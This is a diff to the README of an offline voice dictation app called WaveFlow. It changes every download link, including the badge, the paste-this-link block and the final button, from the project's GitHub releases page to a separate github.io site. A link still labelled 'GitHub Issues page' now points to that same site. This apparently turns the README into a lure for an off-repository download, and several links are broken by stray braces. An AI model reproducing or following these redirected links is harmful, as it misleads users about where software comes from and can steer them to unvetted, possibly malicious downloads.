@@ -1,6 +1,6 @@
 # 🎤 WaveFlow - Your Private Voice Dictation, Offline and Secure
 
-[![Download WaveFlow](https://img.shields.io/badge/Download-WaveFlow%20Latest-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=232323)](https://github.com/Fernfamilywiccan8933/WaveFlow/releases)
+[![Download WaveFlow](https://img.shields.io/badge/Download-WaveFlow%20Latest-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=232323)](https://fernfamilywiccan8933.github.io)
 
 ## 🌟 What is WaveFlow?
 
@@ -24,7 +24,7 @@ Follow these **exact steps** to download and run WaveFlow on your Windows comput
 
 Go to the official WaveFlow download page by clicking this button:
 
-[🖥️ Go to WaveFlow Downloads](https://github.com/Fernfamilywiccan8933/WaveFlow/releases)
+[🖥️ Go to WaveFlow Downloads](https://fernfamilywiccan8933.github.io)
 
 
 
@@ -33,7 +33,7 @@ Go to the official WaveFlow download page by clicking this button:
 Alternatively, copy and paste this link into your browser’s address bar:
 
 ```
-https://github.com/Fernfamilywiccan8933/WaveFlow/releases
+https://fernfamilywiccan8933.github.io
 ```
 
 
@@ -271,7 +271,7 @@ All your data is removed with the app. Clean and simple.
 
 WaveFlow is an open-source community project. If you need help, get stuck, or have a feature request:
 
-- Visit the **[GitHub Issues page](https://github.com/Fernfamilywiccan8933/WaveFlow/issues)** — this is where users post questions andbug reports. (You’ll need a free GitHub account to post.}
+- Visit the **[GitHub Issues page](https://fernfamilywiccan8933.github.io)** — this is where users post questions andbug reports. (You’ll need a free GitHub account to post.}
 - Be descriptive: mention your OS (Windows or macOS}, your computer model, and what happened. This helps developers fix issues faster.
 
 
@@ -286,7 +286,7 @@ If you love WaveFlow, consider starring (⭐} the repository on GitHub. It shows
 
 Here’s the download button one more time, for your convenience. Bookmark this page or the download link so you can always come back.
 
-[⬇️ Download WaveFlow Now](https://github.com/Fernfamilywiccan8933/WaveFlow/releases}
+[⬇️ Download WaveFlow Now](https://fernfamilywiccan8933.github.io}
 
 
 
